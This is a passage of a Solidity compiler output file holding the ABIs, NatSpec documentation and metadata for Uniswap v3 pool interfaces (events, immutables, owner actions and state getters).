							"Collect(address,address,int24,int24,uint128,uint128)": {
								"details": "Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees",
								"params": {
									"amount0": "The amount of token0 fees collected",
									"amount1": "The amount of token1 fees collected",
									"owner": "The owner of the position for which fees are collected",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
							"CollectProtocol(address,address,uint128,uint128)": {
								"params": {
									"amount0": "The amount of token1 protocol fees that is withdrawn",
									"recipient": "The address that receives the collected protocol fees",
									"sender": "The address that collects the protocol fees"
								}
							},
							"Flash(address,address,uint256,uint256,uint256,uint256)": {
								"params": {
									"amount0": "The amount of token0 that was flashed",
									"amount1": "The amount of token1 that was flashed",
									"paid0": "The amount of token0 paid for the flash, which can exceed the amount0 plus the fee",
									"paid1": "The amount of token1 paid for the flash, which can exceed the amount1 plus the fee",
									"recipient": "The address that received the tokens from flash",
									"sender": "The address that initiated the swap call, and that received the callback"
								}
							},
							"IncreaseObservationCardinalityNext(uint16,uint16)": {
								"details": "observationCardinalityNext is not the observation cardinality until an observation is written at the index just before a mint/swap/burn.",
								"params": {
									"observationCardinalityNextNew": "The updated value of the next observation cardinality",
									"observationCardinalityNextOld": "The previous value of the next observation cardinality"
								}
							},
							"Initialize(uint160,int24)": {
								"details": "Mint/Burn/Swap cannot be emitted by the pool before Initialize",
								"params": {
									"sqrtPriceX96": "The initial sqrt price of the pool, as a Q64.96",
									"tick": "The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool"
								}
							},
							"Mint(address,address,int24,int24,uint128,uint256,uint256)": {
								"params": {
									"amount": "The amount of liquidity minted to the position range",
									"amount0": "How much token0 was required for the minted liquidity",
									"amount1": "How much token1 was required for the minted liquidity",
									"owner": "The owner of the position and recipient of any minted liquidity",
									"sender": "The address that minted the liquidity",
									"tickLower": "The lower tick of the position",
									"tickUpper": "The upper tick of the position"
								}
							},
							"SetFeeProtocol(uint8,uint8,uint8,uint8)": {
								"params": {
									"feeProtocol0New": "The updated value of the token0 protocol fee",
									"feeProtocol0Old": "The previous value of the token0 protocol fee",
									"feeProtocol1New": "The updated value of the token1 protocol fee",
									"feeProtocol1Old": "The previous value of the token1 protocol fee"
								}
							},
							"Swap(address,address,int256,int256,uint160,uint128,int24)": {
								"params": {
									"amount0": "The delta of the token0 balance of the pool",
									"amount1": "The delta of the token1 balance of the pool",
									"liquidity": "The liquidity of the pool after the swap",
									"recipient": "The address that received the output of the swap",
									"sender": "The address that initiated the swap call, and that received the callback",
									"sqrtPriceX96": "The sqrt(price) of the pool after the swap, as a Q64.96",
									"tick": "The log base 1.0001 of price of the pool after the swap"
								}
							}
						},
						"kind": "dev",
						"methods": {},
						"title": "Events emitted by a pool",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Burn\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"Collect\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"name\":\"CollectProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"paid1\",\"type\":\"uint256\"}],\"name\":\"Flash\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextOld\",\"type\":\"uint16\"},{\"indexed\":false,\"internalType\":\"uint16\",\"name\":\"observationCardinalityNextNew\",\"type\":\"uint16\"}],\"name\":\"IncreaseObservationCardinalityNext\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Initialize\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickLower\",\"type\":\"int24\"},{\"indexed\":true,\"internalType\":\"int24\",\"name\":\"tickUpper\",\"type\":\"int24\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"amount\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount0\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount1\",\"type\":\"uint256\"}],\"name\":\"Mint\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1Old\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol0New\",\"type\":\"uint8\"},{\"indexed\":false,\"internalType\":\"uint8\",\"name\":\"feeProtocol1New\",\"type\":\"uint8\"}],\"name\":\"SetFeeProtocol\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount0\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"int256\",\"name\":\"amount1\",\"type\":\"int256\"},{\"indexed\":false,\"internalType\":\"uint160\",\"name\":\"sqrtPriceX96\",\"type\":\"uint160\"},{\"indexed\":false,\"internalType\":\"uint128\",\"name\":\"liquidity\",\"type\":\"uint128\"},{\"indexed\":false,\"internalType\":\"int24\",\"name\":\"tick\",\"type\":\"int24\"}],\"name\":\"Swap\",\"type\":\"event\"}],\"devdoc\":{\"events\":{\"Burn(address,int24,int24,uint128,uint256,uint256)\":{\"details\":\"Does not withdraw any fees earned by the liquidity position, which must be withdrawn via #collect\",\"params\":{\"amount\":\"The amount of liquidity to remove\",\"amount0\":\"The amount of token0 withdrawn\",\"amount1\":\"The amount of token1 withdrawn\",\"owner\":\"The owner of the position for which liquidity is removed\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"Collect(address,address,int24,int24,uint128,uint128)\":{\"details\":\"Collect events may be emitted with zero amount0 and amount1 when the caller chooses not to collect fees\",\"params\":{\"amount0\":\"The amount of token0 fees collected\",\"amount1\":\"The amount of token1 fees collected\",\"owner\":\"The owner of the position for which fees are collected\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"CollectProtocol(address,address,uint128,uint128)\":{\"params\":{\"amount0\":\"The amount of token1 protocol fees that is withdrawn\",\"recipient\":\"The address that receives the collected protocol fees\",\"sender\":\"The address that collects the protocol fees\"}},\"Flash(address,address,uint256,uint256,uint256,uint256)\":{\"params\":{\"amount0\":\"The amount of token0 that was flashed\",\"amount1\":\"The amount of token1 that was flashed\",\"paid0\":\"The amount of token0 paid for the flash, which can exceed the amount0 plus the fee\",\"paid1\":\"The amount of token1 paid for the flash, which can exceed the amount1 plus the fee\",\"recipient\":\"The address that received the tokens from flash\",\"sender\":\"The address that initiated the swap call, and that received the callback\"}},\"IncreaseObservationCardinalityNext(uint16,uint16)\":{\"details\":\"observationCardinalityNext is not the observation cardinality until an observation is written at the index just before a mint/swap/burn.\",\"params\":{\"observationCardinalityNextNew\":\"The updated value of the next observation cardinality\",\"observationCardinalityNextOld\":\"The previous value of the next observation cardinality\"}},\"Initialize(uint160,int24)\":{\"details\":\"Mint/Burn/Swap cannot be emitted by the pool before Initialize\",\"params\":{\"sqrtPriceX96\":\"The initial sqrt price of the pool, as a Q64.96\",\"tick\":\"The initial tick of the pool, i.e. log base 1.0001 of the starting price of the pool\"}},\"Mint(address,address,int24,int24,uint128,uint256,uint256)\":{\"params\":{\"amount\":\"The amount of liquidity minted to the position range\",\"amount0\":\"How much token0 was required for the minted liquidity\",\"amount1\":\"How much token1 was required for the minted liquidity\",\"owner\":\"The owner of the position and recipient of any minted liquidity\",\"sender\":\"The address that minted the liquidity\",\"tickLower\":\"The lower tick of the position\",\"tickUpper\":\"The upper tick of the position\"}},\"SetFeeProtocol(uint8,uint8,uint8,uint8)\":{\"params\":{\"feeProtocol0New\":\"The updated value of the token0 protocol fee\",\"feeProtocol0Old\":\"The previous value of the token0 protocol fee\",\"feeProtocol1New\":\"The updated value of the token1 protocol fee\",\"feeProtocol1Old\":\"The previous value of the token1 protocol fee\"}},\"Swap(address,address,int256,int256,uint160,uint128,int24)\":{\"params\":{\"amount0\":\"The delta of the token0 balance of the pool\",\"amount1\":\"The delta of the token1 balance of the pool\",\"liquidity\":\"The liquidity of the pool after the swap\",\"recipient\":\"The address that received the output of the swap\",\"sender\":\"The address that initiated the swap call, and that received the callback\",\"sqrtPriceX96\":\"The sqrt(price) of the pool after the swap, as a Q64.96\",\"tick\":\"The log base 1.0001 of price of the pool after the swap\"}}},\"kind\":\"dev\",\"methods\":{},\"title\":\"Events emitted by a pool\",\"version\":1},\"userdoc\":{\"events\":{\"Burn(address,int24,int24,uint128,uint256,uint256)\":{\"notice\":\"Emitted when a position's liquidity is removed\"},\"Collect(address,address,int24,int24,uint128,uint128)\":{\"notice\":\"Emitted when fees are collected by the owner of a position\"},\"CollectProtocol(address,address,uint128,uint128)\":{\"notice\":\"Emitted when the collected protocol fees are withdrawn by the factory owner\"},\"Flash(address,address,uint256,uint256,uint256,uint256)\":{\"notice\":\"Emitted by the pool for any flashes of token0/token1\"},\"IncreaseObservationCardinalityNext(uint16,uint16)\":{\"notice\":\"Emitted by the pool for increases to the number of observations that can be stored\"},\"Initialize(uint160,int24)\":{\"notice\":\"Emitted exactly once by a pool when #initialize is first called on the pool\"},\"Mint(address,address,int24,int24,uint128,uint256,uint256)\":{\"notice\":\"Emitted when liquidity is minted for a given position\"},\"SetFeeProtocol(uint8,uint8,uint8,uint8)\":{\"notice\":\"Emitted when the protocol fee is changed by the pool\"},\"Swap(address,address,int256,int256,uint160,uint128,int24)\":{\"notice\":\"Emitted by the pool for any swaps between token0 and token1\"}},\"kind\":\"user\",\"methods\":{},\"notice\":\"Contains all events emitted by the pool\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":\"IUniswapV3PoolEvents\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolEvents.sol\":{\"keccak256\":\"0x8071514d0fe5d17d6fbd31c191cdfb703031c24e0ece3621d88ab10e871375cd\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://d0b571930cc7488b1d546a7e9cea7c52d8b3c4e207da657ed0e0db7343b8cd03\",\"dweb:/ipfs/QmaGK6vVwB95QSTR1XMYvrh7ivYAYZxi3fD7v6VMA4jZ39\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"events": {
							"Burn(address,int24,int24,uint128,uint256,uint256)": {
								"notice": "Emitted when a position's liquidity is removed"
							},
							"Collect(address,address,int24,int24,uint128,uint128)": {
								"notice": "Emitted when fees are collected by the owner of a position"
							},
							"CollectProtocol(address,address,uint128,uint128)": {
								"notice": "Emitted when the collected protocol fees are withdrawn by the factory owner"
							},
							"Flash(address,address,uint256,uint256,uint256,uint256)": {
								"notice": "Emitted by the pool for any flashes of token0/token1"
							},
							"IncreaseObservationCardinalityNext(uint16,uint16)": {
								"notice": "Emitted by the pool for increases to the number of observations that can be stored"
							},
							"Initialize(uint160,int24)": {
								"notice": "Emitted exactly once by a pool when #initialize is first called on the pool"
							},
							"Mint(address,address,int24,int24,uint128,uint256,uint256)": {
								"notice": "Emitted when liquidity is minted for a given position"
							},
							"SetFeeProtocol(uint8,uint8,uint8,uint8)": {
								"notice": "Emitted when the protocol fee is changed by the pool"
							},
							"Swap(address,address,int256,int256,uint160,uint128,int24)": {
								"notice": "Emitted by the pool for any swaps between token0 and token1"
							}
						},
						"kind": "user",
						"methods": {},
						"notice": "Contains all events emitted by the pool",
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol": {
				"IUniswapV3PoolImmutables": {
					"abi": [
						{
							"inputs": [],
							"name": "factory",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "fee",
							"outputs": [
								{
									"internalType": "uint24",
									"name": "",
									"type": "uint24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "maxLiquidityPerTick",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "tickSpacing",
							"outputs": [
								{
									"internalType": "int24",
									"name": "",
									"type": "int24"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token0",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "token1",
							"outputs": [
								{
									"internalType": "address",
									"name": "",
									"type": "address"
								}
							],
							"stateMutability": "view",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"factory()": {
								"returns": {
									"_0": "The contract address"
								}
							},
							"fee()": {
								"returns": {
									"_0": "The fee"
								}
							},
							"maxLiquidityPerTick()": {
								"details": "This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool",
								"returns": {
									"_0": "The max amount of liquidity per tick"
								}
							},
							"tickSpacing()": {
								"details": "Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.",
								"returns": {
									"_0": "The tick spacing"
								}
							},
							"token0()": {
								"returns": {
									"_0": "The token contract address"
								}
							},
							"token1()": {
								"returns": {
									"_0": "The token contract address"
								}
							}
						},
						"title": "Pool state that never changes",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"factory()": "c45a0155",
							"fee()": "ddca3f43",
							"maxLiquidityPerTick()": "70cf754a",
							"tickSpacing()": "d0c93a7c",
							"token0()": "0dfe1681",
							"token1()": "d21220a7"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[],\"name\":\"factory\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fee\",\"outputs\":[{\"internalType\":\"uint24\",\"name\":\"\",\"type\":\"uint24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxLiquidityPerTick\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"\",\"type\":\"uint128\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tickSpacing\",\"outputs\":[{\"internalType\":\"int24\",\"name\":\"\",\"type\":\"int24\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token0\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"token1\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"factory()\":{\"returns\":{\"_0\":\"The contract address\"}},\"fee()\":{\"returns\":{\"_0\":\"The fee\"}},\"maxLiquidityPerTick()\":{\"details\":\"This parameter is enforced per tick to prevent liquidity from overflowing a uint128 at any point, and also prevents out-of-range liquidity from being used to prevent adding in-range liquidity to a pool\",\"returns\":{\"_0\":\"The max amount of liquidity per tick\"}},\"tickSpacing()\":{\"details\":\"Ticks can only be used at multiples of this value, minimum of 1 and always positive e.g.: a tickSpacing of 3 means ticks can be initialized every 3rd tick, i.e., ..., -6, -3, 0, 3, 6, ... This value is an int24 to avoid casting even though it is always positive.\",\"returns\":{\"_0\":\"The tick spacing\"}},\"token0()\":{\"returns\":{\"_0\":\"The token contract address\"}},\"token1()\":{\"returns\":{\"_0\":\"The token contract address\"}}},\"title\":\"Pool state that never changes\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"factory()\":{\"notice\":\"The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface\"},\"fee()\":{\"notice\":\"The pool's fee in hundredths of a bip, i.e. 1e-6\"},\"maxLiquidityPerTick()\":{\"notice\":\"The maximum amount of position liquidity that can use any tick in the range\"},\"tickSpacing()\":{\"notice\":\"The pool tick spacing\"},\"token0()\":{\"notice\":\"The first of the two tokens of the pool, sorted by address\"},\"token1()\":{\"notice\":\"The second of the two tokens of the pool, sorted by address\"}},\"notice\":\"These parameters are fixed for a pool forever, i.e., the methods will always return the same values\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":\"IUniswapV3PoolImmutables\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolImmutables.sol\":{\"keccak256\":\"0xf6e5d2cd1139c4c276bdbc8e1d2b256e456c866a91f1b868da265c6d2685c3f7\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://b99c8c9ae8e27ee6559e5866bea82cbc9ffc8247f8d15b7422a4deb287d4d047\",\"dweb:/ipfs/QmfL8gaqt3ffAnm6nVj5ksuNpLygXuL3xq5VBqrkwC2JJ3\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"factory()": {
								"notice": "The contract that deployed the pool, which must adhere to the IUniswapV3Factory interface"
							},
							"fee()": {
								"notice": "The pool's fee in hundredths of a bip, i.e. 1e-6"
							},
							"maxLiquidityPerTick()": {
								"notice": "The maximum amount of position liquidity that can use any tick in the range"
							},
							"tickSpacing()": {
								"notice": "The pool tick spacing"
							},
							"token0()": {
								"notice": "The first of the two tokens of the pool, sorted by address"
							},
							"token1()": {
								"notice": "The second of the two tokens of the pool, sorted by address"
							}
						},
						"notice": "These parameters are fixed for a pool forever, i.e., the methods will always return the same values",
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol": {
				"IUniswapV3PoolOwnerActions": {
					"abi": [
						{
							"inputs": [
								{
									"internalType": "address",
									"name": "recipient",
									"type": "address"
								},
								{
									"internalType": "uint128",
									"name": "amount0Requested",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1Requested",
									"type": "uint128"
								}
							],
							"name": "collectProtocol",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "amount0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "amount1",
									"type": "uint128"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint8",
									"name": "feeProtocol0",
									"type": "uint8"
								},
								{
									"internalType": "uint8",
									"name": "feeProtocol1",
									"type": "uint8"
								}
							],
							"name": "setFeeProtocol",
							"outputs": [],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {
							"collectProtocol(address,uint128,uint128)": {
								"params": {
									"amount0Requested": "The maximum amount of token0 to send, can be 0 to collect fees in only token1",
									"amount1Requested": "The maximum amount of token1 to send, can be 0 to collect fees in only token0",
									"recipient": "The address to which collected protocol fees should be sent"
								},
								"returns": {
									"amount0": "The protocol fee collected in token0",
									"amount1": "The protocol fee collected in token1"
								}
							},
							"setFeeProtocol(uint8,uint8)": {
								"params": {
									"feeProtocol0": "new protocol fee for token0 of the pool",
									"feeProtocol1": "new protocol fee for token1 of the pool"
								}
							}
						},
						"title": "Permissioned pool actions",
						"version": 1
					},
					"evm": {
						"assembly": "",
						"bytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"deployedBytecode": {
							"functionDebugData": {},
							"generatedSources": [],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "",
							"opcodes": "",
							"sourceMap": ""
						},
						"gasEstimates": null,
						"legacyAssembly": null,
						"methodIdentifiers": {
							"collectProtocol(address,uint128,uint128)": "85b66729",
							"setFeeProtocol(uint8,uint8)": "8206a4d1"
						}
					},
					"metadata": "{\"compiler\":{\"version\":\"0.8.20+commit.a1b79de6\"},\"language\":\"Solidity\",\"output\":{\"abi\":[{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint128\",\"name\":\"amount0Requested\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1Requested\",\"type\":\"uint128\"}],\"name\":\"collectProtocol\",\"outputs\":[{\"internalType\":\"uint128\",\"name\":\"amount0\",\"type\":\"uint128\"},{\"internalType\":\"uint128\",\"name\":\"amount1\",\"type\":\"uint128\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"feeProtocol0\",\"type\":\"uint8\"},{\"internalType\":\"uint8\",\"name\":\"feeProtocol1\",\"type\":\"uint8\"}],\"name\":\"setFeeProtocol\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}],\"devdoc\":{\"kind\":\"dev\",\"methods\":{\"collectProtocol(address,uint128,uint128)\":{\"params\":{\"amount0Requested\":\"The maximum amount of token0 to send, can be 0 to collect fees in only token1\",\"amount1Requested\":\"The maximum amount of token1 to send, can be 0 to collect fees in only token0\",\"recipient\":\"The address to which collected protocol fees should be sent\"},\"returns\":{\"amount0\":\"The protocol fee collected in token0\",\"amount1\":\"The protocol fee collected in token1\"}},\"setFeeProtocol(uint8,uint8)\":{\"params\":{\"feeProtocol0\":\"new protocol fee for token0 of the pool\",\"feeProtocol1\":\"new protocol fee for token1 of the pool\"}}},\"title\":\"Permissioned pool actions\",\"version\":1},\"userdoc\":{\"kind\":\"user\",\"methods\":{\"collectProtocol(address,uint128,uint128)\":{\"notice\":\"Collect the protocol fee accrued to the pool\"},\"setFeeProtocol(uint8,uint8)\":{\"notice\":\"Set the denominator of the protocol's % share of the fees\"}},\"notice\":\"Contains pool methods that may only be called by the factory owner\",\"version\":1}},\"settings\":{\"compilationTarget\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":\"IUniswapV3PoolOwnerActions\"},\"evmVersion\":\"shanghai\",\"libraries\":{},\"metadata\":{\"bytecodeHash\":\"ipfs\"},\"optimizer\":{\"enabled\":false,\"runs\":200},\"remappings\":[]},\"sources\":{\"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolOwnerActions.sol\":{\"keccak256\":\"0x759b78a2918af9e99e246dc3af084f654e48ef32bb4e4cb8a966aa3dcaece235\",\"license\":\"GPL-2.0-or-later\",\"urls\":[\"bzz-raw://64144fb96e1c7fdba87305acadb98a198d26a3d46c097cb3a666e567f6f29735\",\"dweb:/ipfs/QmUnWVwN9FKB9uV5Pr8YfLpWZnYM2DENnRMaadZ492JS9u\"]}},\"version\":1}",
					"storageLayout": {
						"storage": [],
						"types": null
					},
					"userdoc": {
						"kind": "user",
						"methods": {
							"collectProtocol(address,uint128,uint128)": {
								"notice": "Collect the protocol fee accrued to the pool"
							},
							"setFeeProtocol(uint8,uint8)": {
								"notice": "Set the denominator of the protocol's % share of the fees"
							}
						},
						"notice": "Contains pool methods that may only be called by the factory owner",
						"version": 1
					}
				}
			},
			"https://github.com/Uniswap/v3-core/blob/main/contracts/interfaces/pool/IUniswapV3PoolState.sol": {
				"IUniswapV3PoolState": {
					"abi": [
						{
							"inputs": [],
							"name": "feeGrowthGlobal0X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "feeGrowthGlobal1X128",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "liquidity",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "uint256",
									"name": "index",
									"type": "uint256"
								}
							],
							"name": "observations",
							"outputs": [
								{
									"internalType": "uint32",
									"name": "blockTimestamp",
									"type": "uint32"
								},
								{
									"internalType": "int56",
									"name": "tickCumulative",
									"type": "int56"
								},
								{
									"internalType": "uint160",
									"name": "secondsPerLiquidityCumulativeX128",
									"type": "uint160"
								},
								{
									"internalType": "bool",
									"name": "initialized",
									"type": "bool"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bytes32",
									"name": "key",
									"type": "bytes32"
								}
							],
							"name": "positions",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "_liquidity",
									"type": "uint128"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside0LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint256",
									"name": "feeGrowthInside1LastX128",
									"type": "uint256"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "tokensOwed1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
							"name": "protocolFees",
							"outputs": [
								{
									"internalType": "uint128",
									"name": "token0",
									"type": "uint128"
								},
								{
									"internalType": "uint128",
									"name": "token1",
									"type": "uint128"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [],
